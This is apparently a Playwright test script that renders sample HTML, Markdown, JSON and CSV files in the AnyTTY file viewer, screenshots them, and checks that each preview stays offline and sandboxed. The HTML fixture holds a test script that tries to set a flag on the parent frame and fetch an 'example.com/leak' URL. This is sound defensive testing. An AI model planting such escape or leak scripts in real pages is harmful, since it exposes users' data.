import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import { mkdir, readFile } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);
const { chromium } = require(process.env.PLAYWRIGHT_MODULE || 'playwright');
const root = join(dirname(fileURLToPath(import.meta.url)), '..');
const template = await readFile(join(root, 'clients/flutter/assets/file-viewer/viewer.html'), 'utf8');
const output = join(root, 'clients/flutter/artifacts/file-viewer');
await mkdir(output, { recursive: true });
const browser = await chromium.launch({ channel: 'chrome' });
try {
  for (const dark of [false, true]) {
    for (const [name, mime, source] of [
      ['index.html', 'text/html', '<!doctype html><html><head><style>body{font:18px system-ui;padding:24px;background:#f6f8fa;color:#182a30}h1{color:#087e9c}article{border-top:3px solid #20b89b;padding-top:20px}</style></head><body><h1>AnyTTY HTML preview</h1><article>A real HTML document, rendered locally.</article><script>parent.previewEscaped=true;fetch("https://example.com/leak")</script></body></html>'],
      ['notes.md', 'text/markdown', '# AnyTTY\n\nA **local** document preview.\n\n- TUI\n- Web\n- Mobile\n'],
      ['config.json', 'application/json', '{"client":"AnyTTY","local":true,"port":3000}'],
      ['services.csv', 'text/csv', 'Name,Port,Status\nWeb,3000,Ready\nAPI,8080,Ready\n'],
    ]) {
      const page = await browser.newPage({ viewport: { width: 390, height: 780 }, deviceScaleFactor: 2 });
      const errors = [];
      const requests = [];
      page.on('pageerror', error => errors.push(error.message));
      page.on('request', request => requests.push(request.url()));
      const payload = Buffer.from(JSON.stringify({ name, mime, content: Buffer.from(source).toString('base64'), dark, chinese: false, html: name.endsWith('.html') })).toString('base64');
      await page.setContent(template.replaceAll('__ANYTTY_PREVIEW_DATA__', payload).replaceAll('__ANYTTY_NONCE__', randomBytes(24).toString('base64url')));
      if (name.endsWith('.html')) {
        await page.frameLocator('iframe').getByText('AnyTTY HTML preview').waitFor();
        assert.equal(await page.evaluate(() => window.previewEscaped), undefined);
      } else if (name.endsWith('.md')) {
        await page.getByRole('heading', { name: 'AnyTTY', exact: true }).waitFor();
      } else if (name.endsWith('.csv')) {
        await page.locator('canvas').first().waitFor();
      } else {
        await page.getByText('"AnyTTY"', { exact: true }).waitFor();
      }
      await page.screenshot({ path: join(output, `${name}-${dark ? 'dark' : 'light'}.png`) });
      assert.deepEqual(errors, [], `${name} script errors`);
      assert.deepEqual(requests.filter(url => /^https?:/.test(url)), [], `${name} must stay offline`);
      console.log(`Verified ${name} (${dark ? 'dark' : 'light'}): offline, rendered, sandbox intact`);
      await page.close();
    }
  }
} finally {
  await browser.close();
}
